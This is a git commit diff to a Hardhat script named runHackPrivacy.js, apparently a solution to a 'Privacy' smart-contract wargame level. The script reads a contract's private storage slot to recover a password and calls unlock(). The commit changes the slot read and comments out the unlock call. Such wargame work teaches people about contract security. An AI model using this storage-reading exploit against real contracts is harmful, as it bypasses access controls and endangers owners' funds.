8a242edff71c634b1cd541fcf8907e7df816b24e
John M <neshamon@protonmail.com>
2022-02-05 13:36:29 -0600

    Check for byte to array conversion only

--- scripts/runHackPrivacy.js
+++ scripts/runHackPrivacy.js
@@ -6,19 +6,18 @@ const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );
 const main = async () => {
   const privacyAbi = await hre.artifacts.readArtifact("Privacy");
   const privacyContract = await new hre.ethers.Contract("0xFece0f9e85D38AD3092C2a9Fd7b12d6fe449A86E", privacyAbi.abi, wallet);
-  console.log("Delegate contract: " + privacyContract.address);
+  console.log(`Delegate contract: ${privacyContract.address}`);
 
-  let txn1 = await provider.getStorageAt(privacyContract.address, 1);
+  let txn1 = await provider.getStorageAt(privacyContract.address, 5);
   console.log(`Password aquired: ${(hre.ethers.utils.toUtf8String(txn1))}`);
-
 
   let password = hre.ethers.utils.toUtf8String(txn1)
   console.log("Password stored")
 
-  let txn2 = await privacyContract.unlock(txn1);
+  /*let txn2 = await privacyContract.unlock(txn1);
   console.log("Unlocking...")
   await txn2.wait();
-  console.log("Vault unlocked.")
+  console.log("Vault unlocked.")*/
 }
 
 const runMain = async () => {
